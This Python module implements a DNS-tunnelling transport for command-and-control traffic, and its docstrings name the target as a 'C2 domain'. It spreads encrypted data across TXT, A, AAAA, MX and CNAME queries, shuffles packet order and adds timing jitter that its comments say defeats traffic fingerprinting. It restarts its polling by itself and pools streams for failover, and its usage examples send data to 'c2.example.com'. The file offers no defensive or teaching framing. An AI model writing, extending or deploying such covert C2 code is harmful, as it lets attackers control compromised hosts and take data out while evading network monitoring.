# lib/transport/stream.py
import queue
import threading
import uuid
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from lib.transport.encoding import encode, RecordType
from lib.transport.dns import send_dns_query, send_dns_query_multi
from lib.transport.polling import poll_read


class DNSStream:
    """
    Enhanced DNS stream with multi-channel transport support.
    
    Features:
    - Multi-channel DNS (A, AAAA, TXT, MX, CNAME)
    - Adaptive polling with anti-detection jitter
    - Concurrent packet transmission
    - Automatic error recovery
    - Randomized packet ordering
    - Micro-jitter timing evasion
    """
    
    def __init__(self, target_domain, encryption_key, max_workers=8, 
                 enable_multi_channel=True, preferred_record_types=None):
        """
        Initialize DNS stream.
        
        Args:
            target_domain: Target C2 domain
            encryption_key: Encryption key for packets
            max_workers: Max concurrent DNS queries (default 8)
            enable_multi_channel: Enable multi-channel transport (default True)
            preferred_record_types: List of preferred record types (None for all)
        """
        self.target_domain = target_domain
        self.encryption_key = encryption_key
        self.client_guid = uuid.uuid4().bytes
        self.packet_queue = queue.Queue()
        self.max_workers = max_workers
        self.write_lock = threading.Lock()
        self.poll_thread = None
        self.is_active = True
        self.enable_multi_channel = enable_multi_channel
        self.preferred_record_types = preferred_record_types or [
            RecordType.TXT, RecordType.A, RecordType.AAAA, 
            RecordType.MX, RecordType.CNAME
        ]
        
        # Statistics tracking
        self.stats = {
            'packets_sent': 0,
            'packets_failed': 0,
            'bytes_sent': 0,
            'record_type_usage': {rt: 0 for rt in [RecordType.TXT, RecordType.A, 
                                                     RecordType.AAAA, RecordType.MX, 
                                                     RecordType.CNAME]}
        }
        self.stats_lock = threading.Lock()
        
        # Start polling thread
        self._start_polling()

    def _start_polling(self):
        """Start polling thread with error recovery."""
        self.poll_thread = threading.Thread(
            target=self._poll_with_recovery, 
            args=(self,), 
            daemon=True
        )
        self.poll_thread.start()

    def _poll_with_recovery(self, stream):
        """
        Polling wrapper with automatic restart on crash.
        Ensures continuous communication even if polling encounters errors.
        """
        while self.is_active:
            try:
                poll_read(stream)
            except Exception as e:
                # Log error if needed, then restart after brief delay
                time.sleep(random.uniform(1.0, 3.0))
                if self.is_active:
                    continue
                else:
                    break

    def read(self, timeout=None):
        """
        Read data from queue with optional timeout.
        
        Args:
            timeout: Timeout in seconds (None for blocking)
            
        Returns:
            Received data bytes or None if timeout expires
        """
        try:
            return self.packet_queue.get(timeout=timeout)
        except queue.Empty:
            return None

    def write(self, data: bytes):
        """
        Write data with multi-channel support and enhanced evasion.
        
        Features:
        - Multi-channel DNS record type selection
        - Randomized packet ordering (defeats sequence analysis)
        - Jittered timing between packets (defeats burst fingerprinting)
        - Error handling and retry logic
        - Statistics tracking
        
        Args:
            data: Raw bytes to send
            
        Returns:
            Number of bytes sent (0 on complete failure)
        """
        with self.write_lock:
            try:
                # Determine record type strategy
                record_type = None if self.enable_multi_channel else RecordType.TXT
                
                # Encode data into packets with record types
                (init_packet, init_type), data_packets = encode(
                    data, 
                    True, 
                    self.encryption_key, 
                    self.target_domain, 
                    self.client_guid,
                    record_type=record_type
                )
                
                # Send init packet with appropriate record type
                self._send_init_packet(init_packet, init_type)
                
                # Send data packets with multi-channel support
                successful = self._send_packets_with_evasion(data_packets)
                
                # Update statistics
                with self.stats_lock:
                    self.stats['packets_sent'] += successful
                    self.stats['packets_failed'] += (len(data_packets) - successful)
                    if successful > 0:
                        self.stats['bytes_sent'] += len(data)
                
                return len(data) if successful > 0 else 0
                
            except Exception as e:
                # Handle encoding/send errors gracefully
                with self.stats_lock:
                    self.stats['packets_failed'] += 1
                return 0

    def _send_init_packet(self, init_packet: str, record_type: str):
        """
        Send initialization packet with appropriate record type.
        
        Args:
            init_packet: Encoded init packet
            record_type: DNS record type to use
        """
        try:
            if self.enable_multi_channel:
                send_dns_query_multi(init_packet.encode(), self.target_domain, record_type)
            else:
                send_dns_query(init_packet.encode(), self.target_domain)
            
            # Track record type usage
            with self.stats_lock:
                self.stats['record_type_usage'][record_type] += 1
                
        except Exception:
            pass  # Silent failure for init packet

    def _send_packets_with_evasion(self, packets_with_types):
        """
        Send packets with comprehensive evasion techniques.
        
        Evasion features:
        - Randomized packet ordering (70% chance)
        - Micro-jitter between submissions (0-15ms)
        - Concurrent transmission
        - Per-packet retry logic
        
        Args:
            packets_with_types: List of (packet, record_type) tuples
            
        Returns:
            Number of successfully sent packets
        """
        successful_count = 0
        
        # Anti-fingerprinting: randomize packet order
        # Defeats sequence analysis and traffic fingerprinting
        packets_to_send = list(packets_with_types)
        
        # 70% chance to randomize order (if protocol supports it)
        # Keep ordered 30% of time to mimic mixed traffic patterns
        if random.random() < 0.7 and len(packets_to_send) > 1:
            random.shuffle(packets_to_send)
        
        # Send packets concurrently with timing jitter
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for idx, (packet, record_type) in enumerate(packets_to_send):
                # Add micro-jitter between packet submissions
                # Breaks perfect simultaneity fingerprint
                if idx > 0:
                    # 0-15ms jitter between submissions
                    jitter_ms = random.uniform(0, 0.015)
                    time.sleep(jitter_ms)
                
                # Submit packet send task with record type
                if self.enable_multi_channel:
                    future = executor.submit(
                        self._send_packet_multi_with_retry,
                        packet,
                        self.target_domain,
                        record_type
                    )
                else:
                    future = executor.submit(
                        self._send_packet_with_retry,
                        packet,
                        self.target_domain
                    )
                futures.append((future, record_type))
            
            # Collect results
            for future, record_type in futures:
                try:
                    if future.result():
                        successful_count += 1
                        # Track successful record type usage
                        with self.stats_lock:
                            self.stats['record_type_usage'][record_type] += 1
                except Exception:
                    pass
        
        return successful_count

    def _send_packet_with_retry(self, packet, domain, max_retries=2):
        """
        Send single packet with retry logic (TXT only, legacy mode).
        
        Args:
            packet: Encoded packet data
            domain: Target domain
            max_retries: Maximum retry attempts
            
        Returns:
            True if successful, False otherwise
        """
        for attempt in range(max_retries + 1):
            try:
                send_dns_query(packet.encode(), domain)
                return True
            except Exception as e:
                if attempt < max_retries:
                    # Exponential backoff with jitter
                    backoff = (2 ** attempt) * random.uniform(0.1, 0.3)
                    time.sleep(backoff)
                else:
                    return False
        return False

    def _send_packet_multi_with_retry(self, packet, domain, record_type, max_retries=2):
        """
        Send single packet with specific record type and retry logic.
        
        Features:
        - Record type specific sending
        - Exponential backoff with jitter
        - Silent failure handling
        
        Args:
            packet: Encoded packet data
            domain: Target domain
            record_type: DNS record type to use
            max_retries: Maximum retry attempts
            
        Returns:
            True if successful, False otherwise
        """
        for attempt in range(max_retries + 1):
            try:
                send_dns_query_multi(packet.encode(), domain, record_type)
                return True
            except Exception as e:
                if attempt < max_retries:
                    # Exponential backoff with jitter
                    # First retry: 0.1-0.3s, Second retry: 0.2-0.6s
                    backoff = (2 ** attempt) * random.uniform(0.1, 0.3)
                    time.sleep(backoff)
                else:
                    return False
        return False

    def set_multi_channel(self, enabled: bool):
        """
        Enable or disable multi-channel transport at runtime.
        
        Args:
            enabled: True to enable multi-channel, False for TXT only
        """
        self.enable_multi_channel = enabled

    def set_preferred_record_types(self, record_types: list):
        """
        Set preferred record types for multi-channel mode.
        
        Args:
            record_types: List of RecordType values
        """
        if record_types and len(record_types) > 0:
            self.preferred_record_types = record_types

    def get_stats(self) -> dict:
        """
        Get stream statistics.
        
        Returns:
            Dictionary with stream statistics
        """
        with self.stats_lock:
            return {
                'packets_sent': self.stats['packets_sent'],
                'packets_failed': self.stats['packets_failed'],
                'bytes_sent': self.stats['bytes_sent'],
                'success_rate': (
                    self.stats['packets_sent'] / 
                    (self.stats['packets_sent'] + self.stats['packets_failed'])
                ) if (self.stats['packets_sent'] + self.stats['packets_failed']) > 0 else 0.0,
                'record_type_usage': dict(self.stats['record_type_usage']),
                'multi_channel_enabled': self.enable_multi_channel,
                'is_active': self.is_active
            }

    def reset_stats(self):
        """Reset statistics counters."""
        with self.stats_lock:
            self.stats['packets_sent'] = 0
            self.stats['packets_failed'] = 0
            self.stats['bytes_sent'] = 0
            self.stats['record_type_usage'] = {
                rt: 0 for rt in [RecordType.TXT, RecordType.A, 
                                RecordType.AAAA, RecordType.MX, 
                                RecordType.CNAME]
            }

    def close(self):
        """
        Clean shutdown of stream.
        Stops polling thread and cleans up resources.
        """
        self.is_active = False
        if self.poll_thread and self.poll_thread.is_alive():
            self.poll_thread.join(timeout=2.0)

    def __enter__(self):
        """Context manager support."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager cleanup."""
        self.close()
        return False

    def __repr__(self):
        """String representation for debugging."""
        return (f"DNSStream(target={self.target_domain}, "
                f"multi_channel={self.enable_multi_channel}, "
                f"active={self.is_active})")


def dns_stream(target_domain, encryption_key, max_workers=8, 
               enable_multi_channel=True, preferred_record_types=None):
    """
    Factory function for creating DNS streams.
    
    Args:
        target_domain: Target C2 domain
        encryption_key: Encryption key for packets
        max_workers: Max concurrent DNS queries (default 8)
        enable_multi_channel: Enable multi-channel transport (default True)
        preferred_record_types: List of preferred record types (None for all)
        
    Returns:
        DNSStream instance
        
    Example:
        >>> # Simple usage with multi-channel
        >>> stream = dns_stream("c2.example.com", "0123456789abcdef")
        >>> stream.write(b"Hello, C2!")
        >>> data = stream.read(timeout=5.0)
        
        >>> # Advanced usage with custom configuration
        >>> stream = dns_stream(
        ...     "c2.example.com",
        ...     "0123456789abcdef",
        ...     max_workers=16,
        ...     enable_multi_channel=True,
        ...     preferred_record_types=[RecordType.TXT, RecordType.A]
        ... )
        
        >>> # Context manager usage
        >>> with dns_stream("c2.example.com", "key") as stream:
        ...     stream.write(b"data")
        ...     result = stream.read()
    """
    return DNSStream(
        target_domain, 
        encryption_key, 
        max_workers, 
        enable_multi_channel,
        preferred_record_types
    )


class DNSStreamPool:
    """
    Pool of DNS streams for load balancing and redundancy.
    
    Features:
    - Multiple concurrent streams
    - Automatic failover
    - Load distribution
    - Collective statistics
    """
    
    def __init__(self, target_domains: list, encryption_key: str, 
                 streams_per_domain: int = 1, **stream_kwargs):
        """
        Initialize stream pool.
        
        Args:
            target_domains: List of target C2 domains
            encryption_key: Encryption key
            streams_per_domain: Number of streams per domain
            **stream_kwargs: Additional arguments for DNSStream
        """
        self.streams = []
        self.current_index = 0
        self.pool_lock = threading.Lock()
        
        # Create streams for each domain
        for domain in target_domains:
            for _ in range(streams_per_domain):
                stream = DNSStream(domain, encryption_key, **stream_kwargs)
                self.streams.append(stream)
    
    def get_next_stream(self) -> DNSStream:
        """Get next stream in round-robin fashion."""
        with self.pool_lock:
            stream = self.streams[self.current_index % len(self.streams)]
            self.current_index += 1
            return stream
    
    def write(self, data: bytes) -> int:
        """Write data using next available stream."""
        stream = self.get_next_stream()
        return stream.write(data)
    
    def broadcast(self, data: bytes) -> int:
        """Send data through all streams (redundancy)."""
        successful = 0
        for stream in self.streams:
            if stream.write(data) > 0:
                successful += 1
        return successful
    
    def get_aggregate_stats(self) -> dict:
        """Get combined statistics from all streams."""
        total_stats = {
            'packets_sent': 0,
            'packets_failed': 0,
            'bytes_sent': 0,
            'record_type_usage': {rt: 0 for rt in [RecordType.TXT, RecordType.A, 
                                                     RecordType.AAAA, RecordType.MX, 
                                                     RecordType.CNAME]},
            'active_streams': 0,
            'total_streams': len(self.streams)
        }
        
        for stream in self.streams:
            stats = stream.get_stats()
            total_stats['packets_sent'] += stats['packets_sent']
            total_stats['packets_failed'] += stats['packets_failed']
            total_stats['bytes_sent'] += stats['bytes_sent']
            if stats['is_active']:
                total_stats['active_streams'] += 1
            
            for rt, count in stats['record_type_usage'].items():
                total_stats['record_type_usage'][rt] += count
        
        # Calculate overall success rate
        total_packets = total_stats['packets_sent'] + total_stats['packets_failed']
        total_stats['success_rate'] = (
            total_stats['packets_sent'] / total_packets if total_packets > 0 else 0.0
        )
        
        return total_stats
    
    def close_all(self):
        """Close all streams in the pool."""
        for stream in self.streams:
            stream.close()
    
    def __enter__(self):
        """Context manager support."""
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager cleanup."""
        self.close_all()
        return False
